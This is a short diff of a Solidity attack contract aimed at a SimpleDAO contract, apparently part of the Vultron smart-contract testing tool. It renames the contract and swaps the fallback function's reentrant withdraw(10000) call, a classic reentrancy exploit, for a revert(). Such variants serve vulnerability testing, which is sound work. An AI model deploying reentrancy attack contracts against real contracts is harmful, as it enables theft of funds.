@@ -2,11 +2,11 @@ pragma solidity ^0.4.19;
 
 import "/home/hjwang/Tools/vultron/contracts/SimpleDAO.sol";
 
-contract Attack_SimpleDAO0 {
+contract Attack_SimpleDAO2 {
 
   SimpleDAO public target_contract;
 
-  function Attack_SimpleDAO0(address _targetContract) public payable {
+  function Attack_SimpleDAO2(address _targetContract) public payable {
       target_contract = SimpleDAO(_targetContract);
   } 
 
@@ -23,6 +23,6 @@ contract Attack_SimpleDAO0 {
   } 
 
   function() public payable {
-    target_contract.withdraw(10000);
+    revert();
   }
 } 
